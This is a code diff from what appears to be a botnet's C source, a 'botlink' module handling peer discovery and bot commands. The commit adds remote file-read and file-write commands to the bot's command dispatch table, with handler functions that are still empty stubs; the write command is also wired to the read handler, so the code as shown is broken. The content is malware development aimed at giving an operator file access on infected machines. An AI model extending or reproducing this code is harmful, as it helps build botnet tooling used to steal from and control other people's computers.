@@ -103,7 +103,9 @@ enum {
     BOT_CMD_CONTROL_MODULE,
     BOT_CMD_REPORT_IP,
     BOT_CMD_WANT_PEERS,
-    BOT_CMD_PEER_INFO
+    BOT_CMD_PEER_INFO,
+    BOT_CMD_WRITE_FILE,
+    BOT_CMD_READ_FILE,
 };
 
 
@@ -185,17 +187,10 @@ typedef struct _bot_variables {
 
 
 
+
+
 BotVariables *BotVars(Connection *cptr) {
-    if (cptr->buf == NULL) {
-        cptr->buf = (char *)malloc(sizeof(BotVariables) + 1);
-        
-        if (cptr->buf == NULL)
-            return NULL;
-        
-        memset(cptr->buf, 0, sizeof(BotVariables));
-    }
-    
-    return (BotVariables *)cptr->buf;
+    return (BotVariables *)CustomPtr(cptr, sizeof(BotVariables));
 }
 
 
@@ -751,6 +746,8 @@ int botlink_message_exec(Modules *mptr, Connection *cptr, char *buf, int size, b
         { BOT_CMD_WANT_PEERS, &botlink_cmd_want_peers, 0, false, false },
         { BOT_CMD_PEER_INFO, &botlink_cmd_peer_info, sizeof(PeerInfo), false, false },
         //{ BOT_CMD_CONTROL_MODULE, &botlink_cmd_control_module, true, true },
+        { BOT_CMD_READ_FILE, &botlink_cmd_read_file, 0, true, true },
+        { BOT_CMD_WRITE_FILE, &botlink_cmd_read_file, 0, true, true },
         { 0, NULL }
     };
     
@@ -888,6 +885,29 @@ int botlink_cmd_execute(Modules *mptr, Connection *cptr, char *buf, int size) {
     
     return 1;
 }
+
+// we just expect the filename to end with a 0
+// data comes immediately after
+typedef struct _file_info {
+    int file_name_len;
+    int size;
+} FileInfoHdr;
+
+int botlink_cmd_write_file(Modules *mptr, Connection *cptr, char *buf, int size) {
+    FileInfoHdr *finfo = (FileInfoHdr *)buf;
+    char *fname = (char *)buf + sizeof(FileInfoHdr);
+    char *data = (char *)(buf + sizeof(FileInfoHdr) + finfo->file_name_len);
+        
+}
+
+int botlink_cmd_read_file(Modules *mptr, Connection *cptr, char *buf, int size) {
+    FileInfoHdr *finfo = (FileInfoHdr *)buf;
+    
+    char *fname = (char *)buf + sizeof(FileInfoHdr);
+    char *data = (char *)(buf + sizeof(FileInfoHdr) + finfo->file_name_len);
+    
+}
+
 
 /*
 // will finish control module later.. requires an overhaul on every module
